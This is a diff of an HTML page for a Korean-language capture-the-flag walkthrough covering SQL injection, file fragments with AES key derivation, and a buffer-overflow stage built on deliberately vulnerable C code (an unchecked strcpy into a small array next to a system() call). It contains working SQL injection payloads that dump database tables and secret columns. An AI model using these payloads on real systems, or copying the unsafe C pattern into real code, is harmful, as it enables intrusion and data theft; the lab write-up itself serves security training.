-        class="MsoListParagraph"
-        style="margin-left: 74pt; text-indent: -0.25in"
-      >
-        <span style="line-height: 107%; font-family: Wingdings"
-          >ð<span style="font: 7pt 'Times New Roman'">&nbsp; </span></span
-        ><span lang="KO" style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >각 </span
-        ><span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >directory<span lang="KO">에는 </span>‘offering’<span lang="KO"
-            >이라는 공통된 이름의 파일이 있었고 그 안에는 여러 파트로 분해된 것
-            같은 코드가 비춰졌습니다</span
-          >. <span lang="KO">코드의 구조로 보아 </span>‘C<span lang="KO"
-            >언어</span
-          >’ <span lang="KO">코드일 확률이 매우 높습니다</span>.</span
-        >
-      </p>
-
-      <p
-        class="MsoListParagraph"
-        style="margin-left: 74pt; text-indent: -0.25in"
-      >
-        <span style="line-height: 107%; font-family: Wingdings"
-          >ð<span style="font: 7pt 'Times New Roman'">&nbsp; </span></span
-        ><span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >/1, /2, /4 directory<span lang="KO">에는 </span>‘offering’
-          <span lang="KO">파일이 존재하였지만 </span>/3
-          <span lang="KO">공간에만 아무 것도 비춰지지 않았습니다</span>.</span
-        >
-      </p>
-
-      <span
-        style="font-size: 10pt; line-height: 107%; font-family: 'Noto Sans KR'"
-        ><br clear="all" style="page-break-before: always" />
-      </span>
-
-      <p
-        class="MsoNormal"
-        style="
-          text-autospace: ideograph-numeric ideograph-other;
-          word-break: normal;
-        "
-      >
-        <span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >&nbsp;</span
-        >
-      </p>
-
-      <p
-        class="MsoListParagraph"
-        style="margin-left: 56pt; text-indent: -0.25in"
-      >
-        <span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >6.<span style="font: 7pt 'Times New Roman'"
-            >&nbsp;&nbsp;&nbsp;&nbsp;
-          </span></span
-        ><span lang="KO" style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >다시 단서 찾기</span
-        ><span style="line-height: 107%; font-family: 'Noto Sans KR'">.</span>
-      </p>
-
-      <p class="MsoNormal" style="margin-left: 56pt">
-        <span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          ><img
-            border="0"
-            width="470"
-            height="99"
-            id="그림 3"
-            src="images/image047.png"
-        /></span>
-      </p>
-
-      <p
-        class="MsoListParagraph"
-        style="margin-left: 92pt; text-indent: -0.25in"
-      >
-        <span style="line-height: 107%; font-family: Wingdings"
-          >è<span style="font: 7pt 'Times New Roman'">&nbsp; </span></span
-        ><span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >/home/khufu/room/<span lang="KO">에 위치하는 </span
-          >‘papyrus’(/home/khufu/papyrus
-          <span lang="KO">와는 다른 파일</span>)<span lang="KO"
-            >을 읽어봅니다</span
-          >.</span
-        >
-      </p>
-
-      <p
-        class="MsoListParagraph"
-        style="margin-left: 74pt; text-indent: -0.25in"
-      >
-        <span style="line-height: 107%; font-family: Wingdings"
-          >ð<span style="font: 7pt 'Times New Roman'">&nbsp; </span></span
-        ><span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >4<span lang="KO">개의 제물</span>(offering)<span lang="KO"
-            >이 모이는 날 신에게 소원</span
-          >(pray)<span lang="KO">을 빌 수 있을 것이라고 말합니다</span>.</span
-        >
-      </p>
-
-      <p
-        class="MsoListParagraph"
-        style="margin-left: 74pt; text-indent: -0.25in"
-      >
-        <span style="line-height: 107%; font-family: Wingdings"
-          >ð<span style="font: 7pt 'Times New Roman'">&nbsp; </span></span
-        ><span lang="KO" style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >제물이라면 방금 </span
-        ><span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >/1~/4 directory
-          <span lang="KO">아래에 존재하던 </span>‘offering’<span lang="KO"
-            >이라는 파일을 말하는 것 같습니다</span
-          >.</span
-        >
-      </p>
-
-      <p
-        class="MsoListParagraph"
-        style="margin-left: 74pt; text-indent: -0.25in"
-      >
-        <span style="line-height: 107%; font-family: Wingdings"
-          >ð<span style="font: 7pt 'Times New Roman'">&nbsp; </span></span
-        ><span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >/3 <span lang="KO">에서만 </span>‘offering’<span lang="KO"
-            >이 존재하지 않았기 때문에 이 점을 생각해봅니다</span
-          >.</span
-        >
-      </p>
-
-      <p
-        class="MsoListParagraph"
-        style="margin-left: 74pt; text-indent: -0.25in"
-      >
-        <span style="line-height: 107%; font-family: Wingdings"
-          >ð<span style="font: 7pt 'Times New Roman'">&nbsp; </span></span
-        ><span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >‘/home/khufu/room/papyrus’<span lang="KO">에서</span> 2<span
-            lang="KO"
-            >번에 </span
-          >Dedicating(<span lang="KO">봉헌</span>)<span lang="KO"
-            >은 신에게</span
-          >
-          pray<span lang="KO">하기 가장 좋은 방법이라고 말했는데 </span
-          >/home/khufu/room/dedicate
-          <span lang="KO">라는 파일이 존재하는 것을 우린 확인했습니다</span>.
-          <span lang="KO">또한 </span>3<span lang="KO">번에 </span>Offering<span
-            lang="KO"
-            >은 단어들로 구성 되어 있고 이를 작성하기 위해선 </span
-          >book<span lang="KO">과 </span>pen<span lang="KO"
-            >이 필요하다고 말합니다</span
-          >.</span
-        >
-      </p>
-
-      <span
-        style="font-size: 10pt; line-height: 107%; font-family: 'Noto Sans KR'"
-        ><br clear="all" style="page-break-before: always" />
-      </span>
-
-      <p
-        class="MsoNormal"
-        style="
-          text-autospace: ideograph-numeric ideograph-other;
-          word-break: normal;
-        "
-      >
-        <span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >&nbsp;</span
-        >
-      </p>
-
-      <p
-        class="MsoListParagraph"
-        style="margin-left: 56pt; text-indent: -0.25in"
-      >
-        <span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >7.<span style="font: 7pt 'Times New Roman'"
-            >&nbsp;&nbsp;&nbsp;&nbsp;
-          </span></span
-        ><span lang="KO" style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >기존</span
-        ><span style="line-height: 107%; font-family: 'Noto Sans KR'">
-          Offering <span lang="KO">코드 조합해보기</span></span
-        >
-      </p>
-
-      <div
-        style="
-          border: solid windowtext 1pt;
-          padding: 1pt 0in 1pt 4pt;
-          margin-left: 56.15pt;
-          margin-right: 0in;
-        "
-      >
-        <p
-          class="MsoNormal"
-          align="left"
-          style="text-align: left; line-height: 60%; border: none; padding: 0in"
-        >
-          <span
-            style="
-              line-height: 60%;
-              font-family: 'Noto Sans KR';
-              color: black;
-              background: #f4b083;
-            "
-            >#include &lt;stdio.h&gt;</span
-          >
-        </p>
-
-        <p
-          class="MsoNormal"
-          align="left"
-          style="text-align: left; line-height: 60%; border: none; padding: 0in"
-        >
-          <span
-            style="
-              line-height: 60%;
-              font-family: 'Noto Sans KR';
-              color: black;
-              background: #f4b083;
-            "
-            >#include &lt;unistd.h&gt;</span
-          >
-        </p>
-
-        <p
-          class="MsoNormal"
-          align="left"
-          style="text-align: left; line-height: 60%; border: none; padding: 0in"
-        >
-          <span
-            style="
-              line-height: 60%;
-              font-family: 'Noto Sans KR';
-              color: black;
-              background: #f4b083;
-            "
-            >#include &lt;string.h&gt;</span
-          >
-        </p>
-
-        <p
-          class="MsoNormal"
-          align="left"
-          style="text-align: left; line-height: 60%; border: none; padding: 0in"
-        >
-          <span
-            style="
-              line-height: 60%;
-              font-family: 'Noto Sans KR';
-              background: #f4b083;
-            "
-            >&nbsp;</span
-          >
-        </p>
-
-        <p
-          class="MsoNormal"
-          align="left"
-          style="text-align: left; line-height: 60%; border: none; padding: 0in"
-        >
-          <span
-            style="
-              line-height: 60%;
-              font-family: 'Noto Sans KR';
-              color: black;
-              background: #f4b083;
-            "
-            >int main(){</span
-          >
-        </p>
-
-        <p
-          class="MsoNormal"
-          align="left"
-          style="text-align: left; line-height: 60%; border: none; padding: 0in"
-        >
-          <span
-            style="
-              line-height: 60%;
-              font-family: 'Noto Sans KR';
-              color: black;
-              background: #f4b083;
-            "
-            >char code[] = &quot;touch /home/khufu/.</span
-          ><span
-            style="
-              line-height: 60%;
-              font-family: 'Segoe UI Historic', sans-serif;
-              color: black;
-              background: #f4b083;
-            "
-            >&#78780;&#78193;&#78061;&#77991;&#78146;&#78358;</span
-          ><span
-            style="
-              line-height: 60%;
-              font-family: 'Noto Sans KR';
-              color: black;
-              background: #f4b083;
-            "
-            >_</span
-          ><span
-            style="
-              line-height: 60%;
-              font-family: 'Segoe UI Historic', sans-serif;
-              color: black;
-              background: #f4b083;
-            "
-            >&#78350;&#78146;&#78284;</span
-          ><span
-            style="
-              line-height: 60%;
-              font-family: 'Noto Sans KR';
-              color: black;
-              background: #f4b083;
-            "
-            >&quot;</span
-          >
-        </p>
-
-        <p
-          class="MsoNormal"
-          align="left"
-          style="text-align: left; line-height: 60%; border: none; padding: 0in"
-        >
-          <span
-            style="
-              line-height: 60%;
-              font-family: 'Noto Sans KR';
-              color: black;
-              background: #f4b083;
-            "
-            >int core =  system(code);
-          </span>
-        </p>
-
-        <p
-          class="MsoNormal"
-          align="left"
-          style="text-align: left; line-height: 60%; border: none; padding: 0in"
-        >
-          <span
-            style="
-              line-height: 60%;
-              font-family: 'Noto Sans KR';
-              color: black;
-              background: #f4b083;
-            "
-            >char guard[1];</span
-          >
-        </p>
-
-        <p
-          class="MsoNormal"
-          align="left"
-          style="text-align: left; line-height: 60%; border: none; padding: 0in"
-        >
-          <span
-            style="
-              line-height: 60%;
-              font-family: 'Noto Sans KR';
-              color: black;
-              background: #f4b083;
-            "
-            >char altar[7];//2</span
-          >
-        </p>
-
-        <p
-          class="MsoNormal"
-          align="left"
-          style="text-align: left; line-height: 60%; border: none; padding: 0in"
-        >
-          <span
-            style="
-              line-height: 60%;
-              font-family: 'Noto Sans KR';
-              background: #f4b083;
-            "
-            >&nbsp;</span
-          >
-        </p>
-
-        <p
-          class="MsoNormal"
-          align="left"
-          style="text-align: left; line-height: 60%; border: none; padding: 0in"
-        >
-          <span
-            style="
-              line-height: 60%;
-              font-family: 'Noto Sans KR';
-              color: black;
-              background: #f4b083;
-            "
-            >strcpy(altar, offering);</span
-          >
-        </p>
-
-        <p
-          class="MsoNormal"
-          align="left"
-          style="text-align: left; line-height: 60%; border: none; padding: 0in"
-        >
-          <span
-            style="
-              line-height: 60%;
-              font-family: 'Noto Sans KR';
-              background: #f4b083;
-            "
-            >&nbsp;</span
-          >
-        </p>
-
-        <p
-          class="MsoNormal"
-          align="left"
-          style="text-align: left; line-height: 60%; border: none; padding: 0in"
-        >
-          <span
-            style="
-              line-height: 60%;
-              font-family: 'Noto Sans KR';
-              color: black;
-              background: #f4b083;
-            "
-            >return 0;</span
-          >
-        </p>
-
-        <p
-          class="MsoNormal"
-          align="left"
-          style="text-align: left; line-height: 60%; border: none; padding: 0in"
-        >
-          <span
-            style="
-              line-height: 60%;
-              font-family: 'Noto Sans KR';
-              color: black;
-              background: #f4b083;
-            "
-            >}</span
-          >
+  <body>
+    <header class="site-header">
+      <div class="container">
+        <h1 class="site-title">Pyramid CTF Walkthrough</h1>
+        <p class="site-subtitle">
+          SQL Injection · Web Exploitation · Crypto · Forensic · BoF
         </p>
       </div>
+    </header>
 
-      <p
-        class="MsoListParagraph"
-        align="left"
-        style="margin-left: 74pt; text-align: left; text-indent: -0.25in"
-      >
-        <span style="line-height: 107%; font-family: Wingdings"
-          >ð<span style="font: 7pt 'Times New Roman'">&nbsp; </span></span
-        ><span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >room/1, room/2, room/4 <span lang="KO">의 </span>offering<span
-            lang="KO"
-            >들을 조합하면 이런 하나의 </span
-          >C<span lang="KO">언어 코드가 나오는데 이 코드를 분석했을 때 </span
-          >strcpy <span lang="KO">함수에 </span>altar
-          <span lang="KO">변수에 옮겨 담을 </span>‘offering’
-          <span lang="KO"
-            >변수가 존재하지 않는 것을 확인할 수 있고 이 과정에서 어떠한 </span
-          >‘<span lang="KO">입력 검증</span>’<span lang="KO"
-            >도 존재하지 않는다는 것을 확인할 수 있습니다</span
-          >. C<span lang="KO"
-            >언어에서 코드를 작성할 때 이러한 입력 값 검증 누락은 </span
-          >BoF
-          <span lang="KO"
-            >취약점을 발생시킬 수 있는 가장 대표적인 취약한 코드 설계로 우리는
-            이 점을 이용해 </span
-          >altar<span lang="KO">에 정적으로 할당된 값보다 더 큰 값을 </span
-          >offering
-          <span lang="KO">변수에 할당하고 이를 </span>/home/khufu/room/book_pen
-          <span lang="KO">파일을 통해 기입해보겠습니다</span>.</span
-        >
-      </p>
+    <main class="container">
+      <!-- 사이드 목차 -->
+      <aside class="toc">
+        <h2>Contents</h2>
+        <ol>
+          <li><a href="#pyramid1">Pyramid 1 – SQLi</a></li>
+          <li><a href="#pyramid2">Pyramid 2 – Split Fragment & Crypto</a></li>
+          <li><a href="#pyramid3">Pyramid 3 – Web Game & File Upload</a></li>
+          <li><a href="#pyramid4">Pyramid 4 – Linux Privilege Escalation</a></li>
+        </ol>
+      </aside>
 
-      <span
-        style="font-size: 10pt; line-height: 107%; font-family: 'Noto Sans KR'"
-        ><br clear="all" style="page-break-before: always" />
-      </span>
+      <section class="content">
+        <!-- Pyramid 1 -->
+        <article id="pyramid1" class="walkthrough-section">
+          <header>
+            <h2>Pyramid 1 – SQL Injection Walkthrough</h2>
+            <p class="meta">
+              목표: 취약한 검색 파라미터를 이용해 테이블·컬럼·데이터를 단계적으로 덤프하고,
+              최종적으로 다음 스테이지로 가는 힌트와 디렉터리 경로를 도출한다.
+            </p>
+          </header>
 
-      <p
-        class="MsoNormal"
-        style="
-          text-autospace: ideograph-numeric ideograph-other;
-          word-break: normal;
-        "
-      >
-        <span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >&nbsp;</span
-        >
-      </p>
+          <section>
+            <h3>1. 서비스 식별 및 기본 SQLi 확인</h3>
+            <p>
+              지정된 Pyramid 서버 IP를 확인한 뒤, HTTP 서비스에 접속하여 검색 기능이 있는 페이지를 확인하였다.
+            </p>
+            <figure>
+              <img src="images/image001.jpg" alt="초기 웹 페이지 화면" />
+              <figcaption>초기 진입 페이지 화면</figcaption>
+            </figure>
 
-      <p
-        class="MsoListParagraph"
-        align="left"
-        style="margin-left: 56pt; text-align: left; text-indent: -0.25in"
-      >
-        <span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >8.<span style="font: 7pt 'Times New Roman'"
-            >&nbsp;&nbsp;&nbsp;&nbsp;
-          </span></span
-        ><span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >/home/khufu/room/book_pen</span
-        >
-      </p>
+            <p>
+              검색 파라미터에 <code>' OR '1'='1</code> 형태의 가장 기초적인 SQLi 페이로드를 입력했을 때,
+              모든 행이 반환되는 동작을 통해 필터링이 거의 없고 쿼리가 직접 조작 가능함을 확인하였다.
+            </p>
+            <figure>
+              <img src="images/image002.jpg" alt="기본 SQLi 페이로드 동작 결과" />
+              <figcaption>기본 SQLi 페이로드로 전체 레코드 조회</figcaption>
+            </figure>
 
-      <p
-        class="MsoListParagraph"
-        align="left"
-        style="margin-left: 56pt; text-align: left"
-      >
-        <span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          ><img
-            border="0"
-            width="501"
-            height="110"
-            id="그림 6"
-            src="images/image048.png"
-        /></span>
-      </p>
+            <ul class="bullet-list">
+              <li>입력값이 필터링 없이 DB 쿼리에 직접 사용된다.</li>
+              <li>파라미터 <code>name</code>이 GET 방식으로 그대로 노출된다.</li>
+              <li>화면에 3개의 컬럼만 출력되지만, 실제 쿼리는 더 많은 컬럼을 포함할 수 있다.</li>
+              <li><code>SELECT</code>, <code>OR</code> 등의 키워드가 차단되지 않아 SQLi 취약점 존재가 확실하다.</li>
+            </ul>
+          </section>
 
-      <p
-        class="MsoListParagraph"
-        align="left"
-        style="margin-left: 74pt; text-align: left; text-indent: -0.25in"
-      >
-        <span style="line-height: 107%; font-family: Wingdings"
-          >ð<span style="font: 7pt 'Times New Roman'">&nbsp; </span></span
-        ><span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >offering
-          <span lang="KO"
-            >변수에 확실하게 주변 주소 값을 침범 할 수 있는 크기의 값을
-            할당해줍니다</span
-          >.(<span lang="KO">위 사진의 값은 예시입니다</span>)</span
-        >
-      </p>
+          <section>
+            <h3>2. UNION 기반 테이블·컬럼 정보 수집</h3>
+            <p>
+              컬럼 개수를 맞춘 뒤 UNION SELECT를 활용하여 현재 데이터베이스의 테이블 이름을 추출하였다.
+            </p>
 
-      <p
-        class="MsoListParagraph"
-        align="left"
-        style="margin-left: 56pt; text-align: left; text-indent: -0.25in"
-      >
-        <span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >9.<span style="font: 7pt 'Times New Roman'"
-            >&nbsp;&nbsp;&nbsp;&nbsp;
-          </span></span
-        ><span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >/home/khufu/room/dedicate</span
-        >
-      </p>
+            <pre class="code-block">
+' UNION SELECT 1, group_concat(table_name), 3
+  FROM information_schema.tables
+ WHERE table_schema = database() --
+            </pre>
 
-      <p
-        class="MsoNormal"
-        align="left"
-        style="margin-left: 56pt; text-align: left"
-      >
-        <span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          ><img
-            border="0"
-            width="488"
-            height="117"
-            id="그림 7"
-            src="images/image049.png"
-        /></span>
-      </p>
+            <figure>
+              <img src="images/image003.jpg" alt="테이블 이름 덤프 결과" />
+              <figcaption>두 번째 컬럼 위치에 테이블 목록 출력</figcaption>
+            </figure>
 
-      <p
-        class="MsoListParagraph"
-        align="left"
-        style="margin-left: 74pt; text-align: left; text-indent: -0.25in"
-      >
-        <span style="line-height: 107%; font-family: Wingdings"
-          >ð<span style="font: 7pt 'Times New Roman'">&nbsp; </span></span
-        ><span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >‘dedicate’ <span lang="KO">파일을 실행시킨 후 </span>room/3/<span
-            lang="KO"
-            >을 확인해보니 </span
-          >‘offering’<span lang="KO">이 생겨났고 내용을 확인하니 우리가 </span
-          >‘book_pen’<span lang="KO">에 기입했던 값이 그대로 들어갔습니다</span
-          >.</span
-        >
-      </p>
+            <p>
+              이후 식별한 대상 테이블(예: <code>pharaohs</code>)에 대해 컬럼 목록을 추출하고자 하였다.
+            </p>
 
-      <p
-        class="MsoListParagraph"
-        align="left"
-        style="margin-left: 74pt; text-align: left; text-indent: -0.25in"
-      >
-        <span style="line-height: 107%; font-family: Wingdings"
-          >ð<span style="font: 7pt 'Times New Roman'">&nbsp; </span></span
-        ><span lang="KO" style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >이제 </span
-        ><span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >/home/khufu/room/papyrus <span lang="KO">내용에 따라</span> offering
-          4<span lang="KO">개가 다 모였으니 </span>pray
-          <span lang="KO">파일을 실행해봅시다</span>.</span
-        >
-      </p>
+            <pre class="code-block">
+' UNION SELECT 1, group_concat(column_name), 3
+  FROM information_schema.columns
+ WHERE table_name = 'pharaohs' --
+            </pre>
 
-      <span
-        style="font-size: 10pt; line-height: 107%; font-family: 'Noto Sans KR'"
-        ><br clear="all" style="page-break-before: always" />
-      </span>
+            <figure>
+              <img src="images/image004.jpg" alt="컬럼 이름 덤프 결과" />
+              <figcaption>테이블 컬럼 전체 목록 수집</figcaption>
+            </figure>
+          </section>
 
-      <p
-        class="MsoNormal"
-        style="
-          text-autospace: ideograph-numeric ideograph-other;
-          word-break: normal;
-        "
-      >
-        <span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >&nbsp;</span
-        >
-      </p>
+          <section>
+            <h3>3. 민감 정보 추출 및 ROT13 힌트 해석</h3>
+            <p>
+              최종적으로 <code>pharaohs</code> 테이블의 민감 컬럼(<code>secret_info</code>)을 대상으로 조건부 조회를 수행하여
+              다음 단계로 이어지는 힌트를 얻었다.
+            </p>
 
-      <p
-        class="MsoListParagraph"
-        align="left"
-        style="margin-left: 56pt; text-align: left; text-indent: -0.25in"
-      >
-        <span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >10.<span style="font: 7pt 'Times New Roman'">&nbsp; </span></span
-        ><span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >/home/khufu/room/pray</span
-        >
-      </p>
+            <pre class="code-block">
+' UNION SELECT 1, 2, secret_info
+  FROM pharaohs
+ WHERE id = 6 --
+            </pre>
 
-      <p
-        class="MsoNormal"
-        align="left"
-        style="margin-left: 56pt; text-align: left"
-      >
-        <span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          ><img
-            border="0"
-            width="318"
-            height="43"
-            id="그림 8"
-            src="images/image050.png"
-        /></span>
-      </p>
+            <figure>
+              <img src="images/image005.jpg" alt="secret_info 컬럼 조회 결과" />
+              <figcaption>secret_info 컬럼에서 최종 힌트 조회</figcaption>
+            </figure>
 
-      <p
-        class="MsoListParagraph"
-        align="left"
-        style="margin-left: 74pt; text-align: left; text-indent: -0.25in"
-      >
-        <span style="line-height: 107%; font-family: Wingdings"
-          >ð<span style="font: 7pt 'Times New Roman'">&nbsp; </span></span
-        ><span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >‘pray’<span lang="KO">를 실행시키니</span> 5<span lang="KO"
-            >번째 변수가</span
-          >
-          redirect<span lang="KO"
-            >를 시도하기 애매하다는 것을 보니 적용되는 변수는 최소 </span
-          >5<span lang="KO"
-            >개 이상이고 이와 지금까지 얻은 정보를 바탕으로 추론을 하면 변수 </span
-          >5<span lang="KO">개 중 </span>4<span lang="KO"
-            >개는 우리가 찾았던 </span
-          >room/n/offering <span lang="KO">파일 </span>4<span lang="KO"
-            >개이고 나머지 하나는</span
-          >
-          redirect <span lang="KO">시킬 파일인 것 같습니다</span>.</span
-        >
-      </p>
+            <p>
+              페이지 소스 주석에는 길고 난해한 문자열이 포함되어 있었고,
+              ROT13 디코딩 도구(예: rot13.com)를 사용해 해석한 결과,  
+              SSH 정보가 아닌 웹 디렉터리 경로와 흐름을 따라가라는 암시임을 파악하였다.
+            </p>
 
-      <p
-        class="MsoListParagraph"
-        align="left"
-        style="margin-left: 74pt; text-align: left; text-indent: -0.25in"
-      >
-        <span style="line-height: 107%; font-family: Wingdings"
-          >ð<span style="font: 7pt 'Times New Roman'">&nbsp; </span></span
-        ><span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >linux<span lang="KO">에서는 </span
-          ><i>“cat file1 file2 &gt;&gt; file3”</i
-          ><span lang="KO">과 같은 명령어 형식으로 </span>file1<span lang="KO"
-            >과 </span
-          >file2<span lang="KO">의 내용을 합친 </span>file3<span lang="KO"
-            >이라는 파일을 만들 수 있고 이 </span
-          >pray <span lang="KO">파일은 각 </span>offering<span lang="KO"
-            >의 파일들의 분할된 </span
-          >c<span lang="KO"
-            >코드를 하나의 코드로 합쳐주는 기능을 하는 것을 추측할 수 있고 </span
-          >c<span lang="KO">언어 파일인 </span>‘.c’
-          <span lang="KO">확장자로 파일을 정해야 할 것입니다</span>.</span
-        >
-      </p>
+            <figure>
+              <img src="images/image007.jpg" alt="ROT13 디코딩 화면" />
+              <figcaption>ROT13 디코딩을 통한 텍스트 해석</figcaption>
+            </figure>
 
-      <p
-        class="MsoListParagraph"
-        align="left"
-        style="margin-left: 74pt; text-align: left; text-indent: -0.25in"
-      >
-        <span style="line-height: 107%; font-family: Wingdings"
-          >ð<span style="font: 7pt 'Times New Roman'">&nbsp; </span></span
-        ><span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >‘/home/khufu/papyrus’
-          <span lang="KO">파일의 구문을 상기시켜봅시다</span>.</span
-        >
-      </p>
+            <p>
+              메시지에 포함된 슬래시(<code>/</code>)와 특정 단어 조합을 통해 URL 패턴을 유추하고,
+              <code>http://pyramidIP/the_architect_of_the_Great_Pyramid</code> 형태의 경로가 다음 스테이지 진입점이라는 결론에 도달하였다.
+            </p>
 
-      <p
-        class="MsoNormal"
-        align="left"
-        style="margin-left: 74pt; text-align: left"
-      >
-        <span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          ><img
-            border="0"
-            width="306"
-            height="64"
-            id="그림 10"
-            src="images/image051.png"
-        /></span>
-      </p>
+            <figure>
+              <img src="images/image008.png" alt="경로 힌트가 포함된 문자열" />
+              <figcaption>문자열 내부의 디렉터리 경로 힌트</figcaption>
+            </figure>
+          </section>
+        </article>
 
-      <p
-        class="MsoListParagraph"
-        align="left"
-        style="margin-left: 92pt; text-align: left; text-indent: -0.25in"
-      >
-        <span style="line-height: 107%; font-family: Wingdings"
-          >è<span style="font: 7pt 'Times New Roman'">&nbsp; </span></span
-        ><span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >‘magi…c’<span lang="KO">이 필요하답니다</span>.</span
-        >
-      </p>
+        <!-- Pyramid 2 -->
+        <article id="pyramid2" class="walkthrough-section">
+          <header>
+            <h2>Pyramid 2 – Split Fragment & Decryption</h2>
+            <p class="meta">
+              목표: 웹 리소스 곳곳에 흩어져 있는 fragment를 수집하고, 제공된 쉘 스크립트 로직을 따라
+              키 파생 및 AES 복호화를 수행하여 다음 단계 비밀번호를 얻는다.
+            </p>
+          </header>
 
-      <p
-        class="MsoListParagraph"
-        align="left"
-        style="margin-left: 92pt; text-align: left; text-indent: -0.25in"
-      >
-        <span style="line-height: 107%; font-family: Wingdings"
-          >è<span style="font: 7pt 'Times New Roman'">&nbsp; </span></span
-        ><span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >‘magi’<span lang="KO">라는 이름을 가진 </span>‘.c’<span lang="KO"
-            >파일을 만들어보면 어떨까요</span
-          >.</span
-        >
-      </p>
+          <section>
+            <h3>1. Fragment 수집 (HTML, JS, 이미지 메타데이터)</h3>
+            <p>
+              <code>/the_architect_of_the_Great_Pyramid/</code>에 접속하면 fragment가 세 곳에 나뉘어 존재한다는 안내 문구와
+              위치에 대한 간단한 힌트를 확인할 수 있다.
+            </p>
 
-      <p
-        class="MsoNormal"
-        align="left"
-        style="margin-left: 40pt; text-align: left"
-      >
-        <span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          ><img
-            border="0"
-            width="602"
-            height="263"
-            id="그림 12"
-            src="images/image052.jpg"
-        /></span>
-      </p>
+            <figure>
+              <img src="images/image010.jpg" alt="fragment 안내 페이지" />
+              <figcaption>세 개의 fragment와 위치에 대한 설명</figcaption>
+            </figure>
 
-      <p
-        class="MsoListParagraph"
-        align="left"
-        style="margin-left: 74pt; text-align: left; text-indent: -0.25in"
-      >
-        <span style="line-height: 107%; font-family: Wingdings"
-          >ð<span style="font: 7pt 'Times New Roman'">&nbsp; </span></span
-        ><span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >‘pray’
-          <span lang="KO">명령어는 성공적으로 실행됐고 </span>magi.c<span
-            lang="KO"
-            >를 생성한 곳으로 가서 파일을 확인해보니 정말 </span
-          >offering <span lang="KO">파일 </span>4<span lang="KO"
-            >개가 하나로 합쳐진 </span
-          >c<span lang="KO">코드가 완성됐습니다</span>.</span
-        >
-      </p>
+            <ul class="bullet-list">
+              <li>Fragment 1: 페이지 소스 내 주석에서 <code>Xv9A</code> 문자열 확인.</li>
+              <li>Fragment 2: <code>assets/script.js</code>에서 <code>MuS7</code>라는 hex 관련 힌트 확보.</li>
+              <li>Fragment 3: <code>assets/hint.png</code> 이미지 메타데이터의 Comment 필드에서 <code>z9Qp</code> 발견 (exiftool 사용).</li>
+            </ul>
 
-      <span
-        style="font-size: 10pt; line-height: 107%; font-family: 'Noto Sans KR'"
-        ><br clear="all" style="page-break-before: always" />
-      </span>
+            <figure>
+              <img src="images/image014.jpg" alt="exiftool 메타데이터 결과" />
+              <figcaption>hint.png 메타데이터 Comment 필드의 fragment</figcaption>
+            </figure>
+          </section>
 
-      <p
-        class="MsoNormal"
-        style="
-          text-autospace: ideograph-numeric ideograph-other;
-          word-break: normal;
-        "
-      >
-        <span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >&nbsp;</span
-        >
-      </p>
+          <section>
+            <h3>2. Fragment 결합 및 키 파생</h3>
+            <p>
+              세 fragment를 지정된 순서대로 이어붙여 하나의 문자열로 만든 뒤,
+              페이지 하단에 안내된 쉘 스크립트 로직을 사용해 AES 키를 파생하였다.
+            </p>
 
-      <p
-        class="MsoListParagraph"
-        align="left"
-        style="margin-left: 56pt; text-align: left; text-indent: -0.25in"
-      >
-        <span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >11.<span style="font: 7pt 'Times New Roman'">&nbsp; </span></span
-        ><span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >/home/khufu/magic</span
-        >
-      </p>
+            <pre class="code-block">
+concat="Xv9AMuS7z9Qp"
+keyhex=$(echo -n "$concat" | openssl dgst -sha256 -binary | xxd -p -c 256 | cut -c1-32)
+echo "Derived key (hex, 16 bytes): $keyhex"
+            </pre>
 
-      <p
-        class="MsoNormal"
-        align="left"
-        style="margin-left: 56pt; text-align: left"
-      >
-        <span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          ><img
-            border="0"
-            width="312"
-            height="76"
-            id="그림 21"
-            src="images/image053.png"
-        /></span>
-      </p>
+            <figure>
+              <img src="images/image016.jpg" alt="키 파생 스크립트 안내" />
+              <figcaption>페이지 하단에 제공된 키 파생 쉘 스크립트</figcaption>
+            </figure>
 
-      <p
-        class="MsoListParagraph"
-        align="left"
-        style="margin-left: 74pt; text-align: left; text-indent: -0.25in"
-      >
-        <span style="line-height: 107%; font-family: Wingdings"
-          >ð<span style="font: 7pt 'Times New Roman'">&nbsp; </span></span
-        ><span lang="KO" style="line-height: 107%; font-family: 'Noto Sans KR'"
